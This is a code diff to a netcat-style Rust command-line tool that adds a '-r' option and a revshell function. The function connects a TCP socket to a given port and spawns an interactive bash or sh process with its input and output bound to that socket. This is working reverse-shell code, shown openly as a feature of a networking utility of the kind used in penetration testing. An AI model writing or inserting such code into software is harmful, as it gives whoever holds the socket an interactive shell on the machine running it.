@@ -4,10 +4,19 @@
 /////////////////////////////
 
 use rustyline::error::ReadlineError;
+use std::net::SocketAddr;
+use std::process::{Command, Stdio};
 use rustyline::Editor;
 use std::io::{self, Write};
 use getopts::Options;
 use termion::color;
+
+extern crate socket2;
+
+use self::socket2::{Socket, Domain, Type};
+
+use std::os::unix::io::{AsRawFd, FromRawFd};
+
 
 /* Global Variables */
 const __VERSION__: &'static str = env!("CARGO_PKG_VERSION");
@@ -189,6 +198,43 @@ fn listen(opts: &Opts) -> std::io::Result<()> {
     return Ok(());
 }
 
+/* Open A Sh/Bash Reverse Shell */
+fn revshell(port: String, shell: String){
+    // Limit to just these 
+    if shell != "bash" && shell != "sh"
+    {
+        print_error("Invalid Shell. Available shells (bash/sh).");
+        return;
+    }
+
+    let full: String = ["0.0.0.0", &port].join(":");
+    
+    let socket = Socket::new(Domain::ipv4(), Type::stream(), None).unwrap();
+
+    match socket.connect(&full.parse::<SocketAddr>().unwrap().into()) {
+        Ok(_) => {}
+        Err(err) => print_error(&err.to_string())
+    }
+
+    let s = socket.into_tcp_stream();
+
+    let fd = s.as_raw_fd();
+
+    // Open shell
+    Command::new(format!("/bin/{}", shell))
+        .arg("-i")
+        .stdin(unsafe { Stdio::from_raw_fd(fd) })
+        .stdout(unsafe { Stdio::from_raw_fd(fd) })
+        .stderr(unsafe { Stdio::from_raw_fd(fd) })
+        .spawn()
+        .unwrap()
+        .wait()
+        .unwrap();
+
+
+    println!("Shell exited");
+}
+
 /* Main */
 fn main() {
     let args: Vec<String> = std::env::args().collect();
@@ -197,10 +243,12 @@ fn main() {
     let mut opts = Options::new();
     opts.optflag("h", "help", "This help text");
     opts.optflag("v", "version", "Application Version");
-    opts.optflag("H", "history", "Command history for tcp (Beta)");
+    opts.optflag("H", "history", "Command history for tcp");
     opts.optflag("l", "", "Listen mode");
-    opts.optflag("p", "", "Listen port");
-    opts.optflag("u", "", "UDP mode (Beta)");
+    opts.optflag("p", "", "Port");
+    opts.optflag("u", "", "UDP mode");
+    opts.optflag("r", "", "Reverse Shell");
+
 
     let matches = match opts.parse(&args[1..]) {
         Ok(m) => m,
@@ -210,6 +258,7 @@ fn main() {
         }
     };
 
+    // Help/about
     if matches.opt_present("h") {
         print_help(&program, opts);
         return;
@@ -218,6 +267,25 @@ fn main() {
         return;
     }
 
+    // Reverse Shell
+    if matches.opt_present("r") {
+        let opt_port: String;
+        let opt_shell: String;
+
+
+        if matches.free.len() == 2 && matches.opt_present("p") {
+            opt_port = matches.free[0].to_string();
+            opt_shell = matches.free[1].to_string();
+        } else {
+            print_help(&program, opts);
+            return;
+        };
+        
+        revshell(opt_port, opt_shell);
+        return;
+    }
+
+    // Listen mode
     if matches.opt_present("l") {
         let (opt_host, opt_port) = if matches.free.len() == 1 && matches.opt_present("p") {
             ("0.0.0.0", matches.free[0].as_str())
